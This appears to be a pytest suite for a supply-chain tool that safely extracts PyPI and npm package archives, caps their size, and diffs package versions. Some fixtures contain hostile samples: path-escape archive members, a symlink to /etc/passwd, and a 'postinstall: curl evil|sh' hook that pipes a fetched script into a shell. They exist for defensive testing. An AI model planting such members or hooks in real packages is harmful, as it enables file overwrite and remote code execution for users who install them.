"""Tests for caliper.data.pkgsrc -- package fetch/extract/diff.

DPS-12 domains:
  Integrity (SAFETY): safe_extract never writes outside the destination
    (zip-slip / tar path-escape / absolute-path / symlink members all rejected).
  Boundedness (PERFORMANCE): extraction enforces total-size, file-count, and
    single-file caps (zip-bomb defense).
  Availability / fail-open (LIVENESS): a 404, timeout, or unsafe archive yields
    FetchedPackage(available=False) rather than raising.
  Determinism (INVARIANT): the same two trees always produce an identical VersionDiff.
"""

from __future__ import annotations

import io
import tarfile
import zipfile
from pathlib import Path

import httpx
import pytest
import respx

from caliper.core.registries import PACKAGE_SOURCES
from caliper.core.supply_chain_models import FetchedPackage, FileChange
from caliper.data.pkgsrc import (
    ExtractionError,
    NpmSource,
    PyPISource,
    diff_versions,
    safe_extract,
)


# --------------------------------------------------------------------------- #
# archive builders
# --------------------------------------------------------------------------- #
def _tar_bytes(members: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, data in members.items():
            info = tarfile.TarInfo(name=name)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def _tar_with_symlink(name: str, target: str) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        info = tarfile.TarInfo(name=name)
        info.type = tarfile.SYMTYPE
        info.linkname = target
        tf.addfile(info)
    return buf.getvalue()


def _zip_bytes(members: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, data in members.items():
            zf.writestr(name, data)
    return buf.getvalue()


# --------------------------------------------------------------------------- #
# safe_extract — happy path
# --------------------------------------------------------------------------- #
class TestSafeExtract:
    def test_extracts_tar(self, tmp_path: Path) -> None:
        safe_extract(_tar_bytes({"pkg/a.py": b"x=1\n", "pkg/b.py": b"y=2\n"}), tmp_path)
        assert (tmp_path / "pkg" / "a.py").read_text() == "x=1\n"
        assert (tmp_path / "pkg" / "b.py").read_text() == "y=2\n"

    def test_extracts_zip(self, tmp_path: Path) -> None:
        safe_extract(_zip_bytes({"pkg/a.js": b"1"}), tmp_path)
        assert (tmp_path / "pkg" / "a.js").read_bytes() == b"1"


# --------------------------------------------------------------------------- #
# safe_extract — security boundary (Integrity SAFETY)
# --------------------------------------------------------------------------- #
class TestProperties:
    def test_tar_path_escape_rejected(self, tmp_path: Path) -> None:
        with pytest.raises(ExtractionError):
            safe_extract(_tar_bytes({"../evil.py": b"pwn"}), tmp_path)
        assert not (tmp_path.parent / "evil.py").exists()

    def test_tar_absolute_path_rejected(self, tmp_path: Path) -> None:
        with pytest.raises(ExtractionError):
            safe_extract(_tar_bytes({"/etc/evil": b"pwn"}), tmp_path)

    def test_tar_symlink_rejected(self, tmp_path: Path) -> None:
        with pytest.raises(ExtractionError):
            safe_extract(_tar_with_symlink("pkg/link", "/etc/passwd"), tmp_path)

    def test_zip_slip_rejected(self, tmp_path: Path) -> None:
        with pytest.raises(ExtractionError):
            safe_extract(_zip_bytes({"../../evil.py": b"pwn"}), tmp_path)

    def test_total_size_cap_enforced(self, tmp_path: Path) -> None:  # Boundedness
        with pytest.raises(ExtractionError):
            safe_extract(
                _tar_bytes({"pkg/a": b"a" * 2000, "pkg/b": b"b" * 2000}),
                tmp_path,
                max_total_bytes=3000,
            )

    def test_file_count_cap_enforced(self, tmp_path: Path) -> None:  # Boundedness
        members = {f"pkg/f{i}": b"x" for i in range(5)}
        with pytest.raises(ExtractionError):
            safe_extract(_tar_bytes(members), tmp_path, max_files=3)

    def test_single_file_cap_enforced(self, tmp_path: Path) -> None:  # Boundedness
        with pytest.raises(ExtractionError):
            safe_extract(_tar_bytes({"pkg/big": b"x" * 5000}), tmp_path, max_file_bytes=1000)

    def test_diff_is_deterministic(self, tmp_path: Path) -> None:  # Determinism
        old = _make_tree(tmp_path / "old", {"a.py": "x=1\n", "gone.py": "old\n"})
        new = _make_tree(tmp_path / "new", {"a.py": "x=2\n", "new.py": "fresh\n"})
        kw = dict(package="p", ecosystem="pypi", old_version="1", new_version="2")
        d1 = diff_versions(old, new, **kw)
        d2 = diff_versions(old, new, **kw)
        assert d1.model_dump() == d2.model_dump()


# --------------------------------------------------------------------------- #
# diff_versions
# --------------------------------------------------------------------------- #
def _make_tree(root: Path, files: dict[str, str]) -> FetchedPackage:
    root.mkdir(parents=True, exist_ok=True)
    for rel, content in files.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content)
    return FetchedPackage(available=True, root=root)


class TestDiffVersions:
    def test_classifies_added_removed_modified(self, tmp_path: Path) -> None:
        old = _make_tree(tmp_path / "o", {"keep.py": "v=1\n", "gone.py": "bye\n"})
        new = _make_tree(tmp_path / "n", {"keep.py": "v=2\n", "added.py": "hi\n"})
        d = diff_versions(old, new, package="p", ecosystem="pypi", old_version="1", new_version="2")
        by_path = {f.path: f.change for f in d.files}
        assert by_path["keep.py"] == FileChange.modified
        assert by_path["added.py"] == FileChange.added
        assert by_path["gone.py"] == FileChange.removed
        assert "added.py" in d.added_paths
        assert "gone.py" in d.removed_paths

    def test_modified_carries_unified_excerpt(self, tmp_path: Path) -> None:
        old = _make_tree(tmp_path / "o", {"a.py": "x=1\n"})
        new = _make_tree(tmp_path / "n", {"a.py": "x=2\n"})
        d = diff_versions(old, new, package="p", ecosystem="pypi", old_version="1", new_version="2")
        delta = d.files[0]
        assert "-x=1" in delta.diff_excerpt and "+x=2" in delta.diff_excerpt
        assert delta.added_lines >= 1 and delta.removed_lines >= 1

    def test_unavailable_source_marks_diff_unavailable(self, tmp_path: Path) -> None:
        ok = _make_tree(tmp_path / "n", {"a.py": "x\n"})
        bad = FetchedPackage(available=False, error="boom")
        d = diff_versions(bad, ok, package="p", ecosystem="pypi", old_version="1", new_version="2")
        assert d.available is False and "boom" in d.error

    def test_metadata_carried_through(self, tmp_path: Path) -> None:
        old = FetchedPackage(available=True, root=_mk(tmp_path / "o"), maintainer="alice")
        new = FetchedPackage(
            available=True,
            root=_mk(tmp_path / "n"),
            maintainer="mallory",
            install_scripts=("postinstall: curl evil|sh",),
        )
        d = diff_versions(old, new, package="p", ecosystem="npm", old_version="1", new_version="2")
        assert d.old_maintainer == "alice" and d.new_maintainer == "mallory"
        assert d.new_install_scripts == ("postinstall: curl evil|sh",)


def _mk(root: Path) -> Path:
    root.mkdir(parents=True, exist_ok=True)
    (root / "index.js").write_text("module.exports = 1\n")
    return root


# --------------------------------------------------------------------------- #
# PyPISource / NpmSource (Availability / fail-open) — respx mocked
# --------------------------------------------------------------------------- #
class TestPyPISource:
    @respx.mock
    def test_fetches_and_extracts_sdist(self, tmp_path: Path) -> None:
        respx.get("https://pypi.org/pypi/foo/1.0/json").mock(
            return_value=httpx.Response(
                200,
                json={
                    "info": {"author": "alice"},
                    "urls": [{"packagetype": "sdist", "url": "https://files/foo-1.0.tar.gz"}],
                },
            )
        )
        respx.get("https://files/foo-1.0.tar.gz").mock(
            return_value=httpx.Response(200, content=_tar_bytes({"foo-1.0/foo.py": b"x=1\n"}))
        )
        fp = PyPISource().fetch_version("foo", "1.0", tmp_path)
        assert fp.available is True
        assert fp.maintainer == "alice"
        assert (fp.root / "foo.py").read_text() == "x=1\n"

    @respx.mock
    def test_404_is_fail_open(self, tmp_path: Path) -> None:
        respx.get("https://pypi.org/pypi/foo/9.9/json").mock(return_value=httpx.Response(404))
        fp = PyPISource().fetch_version("foo", "9.9", tmp_path)
        assert fp.available is False

    @respx.mock
    def test_timeout_is_fail_open(self, tmp_path: Path) -> None:
        respx.get("https://pypi.org/pypi/foo/1.0/json").mock(side_effect=httpx.ReadTimeout("slow"))
        fp = PyPISource().fetch_version("foo", "1.0", tmp_path)
        assert fp.available is False


class TestNpmSource:
    @respx.mock
    def test_fetches_extracts_and_reads_scripts(self, tmp_path: Path) -> None:
        respx.get("https://registry.npmjs.org/bar/2.0").mock(
            return_value=httpx.Response(
                200,
                json={
                    "scripts": {"postinstall": "node evil.js", "test": "jest"},
                    "_npmUser": {"name": "mallory"},
                    "dist": {"tarball": "https://reg/bar-2.0.tgz"},
                },
            )
        )
        respx.get("https://reg/bar-2.0.tgz").mock(
            return_value=httpx.Response(200, content=_tar_bytes({"package/index.js": b"1\n"}))
        )
        fp = NpmSource().fetch_version("bar", "2.0", tmp_path)
        assert fp.available is True
        assert fp.maintainer == "mallory"
        assert fp.install_scripts == ("postinstall: node evil.js",)
        assert (fp.root / "index.js").read_text() == "1\n"

    @respx.mock
    def test_missing_tarball_is_fail_open(self, tmp_path: Path) -> None:
        respx.get("https://registry.npmjs.org/bar/2.0").mock(
            return_value=httpx.Response(200, json={"dist": {}})
        )
        fp = NpmSource().fetch_version("bar", "2.0", tmp_path)
        assert fp.available is False


class TestRegistry:
    def test_pypi_and_npm_registered(self) -> None:
        assert "pypi" in PACKAGE_SOURCES
        assert "npm" in PACKAGE_SOURCES
        assert PACKAGE_SOURCES.create("pypi").name == "pypi"
        assert PACKAGE_SOURCES.create("npm").name == "npm"


if __name__ == "__main__":  # pragma: no cover
    pytest.main([__file__, "-v"])
